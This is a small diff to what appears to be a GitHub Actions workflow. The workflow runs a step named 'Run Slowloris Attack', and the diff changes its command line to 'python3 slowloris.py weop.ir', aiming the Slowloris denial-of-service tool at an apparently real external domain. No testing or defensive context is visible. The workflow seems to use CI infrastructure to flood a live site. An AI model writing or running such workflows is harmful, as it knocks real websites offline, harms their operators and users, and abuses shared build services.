@@ -19,6 +19,5 @@ jobs:
         python-version: '3.x'  # Ensure Python 3.x is installed
 
     - name: Run Slowloris Attack
-      working-directory: ./slowloris  # Change directory to slowloris
       run: |
-        python3 slowloris.py https://weop.ir/0/dashboard/
+        python3 slowloris.py weop.ir
